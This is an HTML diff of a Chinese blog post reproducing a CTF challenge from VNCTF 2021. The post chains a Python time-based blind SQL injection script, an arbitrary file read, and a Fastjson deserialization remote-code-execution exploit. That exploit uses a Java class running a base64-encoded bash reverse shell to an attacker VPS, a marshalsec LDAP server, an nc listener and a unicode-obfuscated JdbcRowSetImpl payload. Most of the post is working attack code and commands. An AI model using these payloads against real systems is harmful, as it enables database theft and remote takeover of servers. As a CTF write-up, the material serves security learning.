@@ -196,7 +196,55 @@
       </header>
     
     <div class="article-entry" itemprop="articleBody">
-    
+
+
+	
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自己太菜了，VNCTF没做出来几个题，签到即退场。</p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>简单的SQL注入</p>
+<p>fastjson Rce复现 </p>
+<a id="more"></a>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在Fastjson&lt;=1.2.47存在fastjson反序列化漏洞。</p>
+<p>关于Fastjson 1.2.47 可以看这篇文章 <a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/" target="_blank" rel="noopener">fastjson</a></p>
+<p>这题根据提示Only the admin can get the right. 可以猜到用户名，password那里通过fuzz</p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214000589.png" alt="image-20210316214000589"></p>
+<p>可以发现<code>&#39;#</code>的时候会返回200，sleep，空格，benchmark等都被ban了，本题用的是笛卡尔积时间盲注。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> true:</span><br><span class="line">        j=head+(tail-head)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==min:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">"-1'or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#"</span>.format(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            min=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            max=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出password，登录网站。</p>
+<p>这个图片存放路径<code>searchimage</code>存在一个任意文件读取。</p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214845265.png" alt="image-20210316214845265"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.2.27&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过pom.xml可以看到<code>fastion</code>的依赖</p>
+<p>再利用<code>ldap</code>协议进行攻击。</p>
+<p>利用自己的VPS开三个端口，并启动http协议，端口1用作恶意java类，端口2用作开启<code>ldap</code>,端口3用作监听反弹shell</p>
+<p>端口写一个java的<code>exp</code>，并进行javac生成类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123; <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;<span class="keyword">try</span> &#123;</span><br><span class="line">Runtime.getRuntime().exec( <span class="string">"bash -c</span></span><br><span class="line"><span class="string">&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK&#125;|&#123;base64,-d&#125;| &#123;bash,-i&#125;"</span>); &#125; <span class="keyword">catch</span> (Exception e) &#123; e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123; Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK</code>是一串反弹shell的base64。把这里改成自己的VPS地址和端口就好。</p>
+<p>然后执行<code>javac Exploit.java</code>产生class。</p>
+<p>在这个文件夹上启动http服务：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server port1</span><br></pre></td></tr></table></figure>
+
+<p>端口2启动<code>ldap</code>服务，先在github上下载 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p>
+<p>然后用<code>maven</code>构建项目:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>targe</code>目录，开启<code>ldap</code>服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;x.x.x.x:port1#Exploit&quot; port2</span><br></pre></td></tr></table></figure>
+
+<p>端口3执行监听反弹shell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp port3</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson=&#123;"name":&#123;"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"&#125;,"x":&#123;"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://x.x.x.x:port2/Exploit","\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220526132.png" alt="image-20210316220526132"></p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220614741.png" alt="image-20210316220614741"></p>
+
+	
 
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自己太菜了，VNCTF没做出来几个题，签到即退场。</p>
